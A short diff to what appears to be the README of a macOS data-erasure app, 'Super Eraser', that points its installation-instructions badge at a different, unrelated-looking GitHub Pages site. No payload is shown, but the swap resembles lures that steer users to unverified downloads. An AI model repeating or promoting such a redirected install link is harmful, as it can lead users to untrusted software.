@@ -9,7 +9,7 @@
 With multiple erasure algorithms, user-friendly controls, and full macOS compatibility, Super Eraser ensures sensitive data is securely removed from your MacBook or desktop.  
 
 <div align="center">  
-<a href="https://super-eraser.github.io/.github">  
+<a href="https://rumpels-kaji.github.io/.github/Super">  
 <img src="https://img.shields.io/badge/⬇️_GET_INSTALLATION_INSTRUCTION-darkblue?style=for-the-badge&logo=apple" alt="Install Super Eraser on MacBook">  
 </a>  
 </div>  
